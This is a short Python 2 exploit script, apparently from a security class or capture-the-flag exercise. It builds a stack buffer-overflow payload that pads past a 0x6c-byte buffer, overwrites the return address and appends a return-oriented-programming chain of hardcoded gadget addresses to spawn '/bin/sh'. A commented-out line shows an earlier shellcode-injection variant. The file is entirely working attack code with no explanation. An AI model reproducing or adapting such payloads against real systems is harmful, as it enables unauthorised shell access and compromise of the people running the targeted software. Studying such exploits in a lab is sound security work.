from shellcode import shellcode
from struct import pack
#print shellcode + "\x01" * (0x6c - len(shellcode)) + pack("<I", 0xbffe71bc)

print "/bin/sh" + "\x88" * (0x6c - 11) + pack("<I", 0xbffe71bc) + "x" * 4 + pack("<I", 0x080560db) + pack("<I", 0x08055dd8) + pack("<I", 0x0806a69c) + pack("<I", 0x080c4ae5) + pack("<I", 0x08055fa5) + pack("<I", 0x0805ebf7) + pack("<I", 0x08055ef0) + pack("<I", 0x0807b2d9) * 11 + pack("<I", 0x0804949a)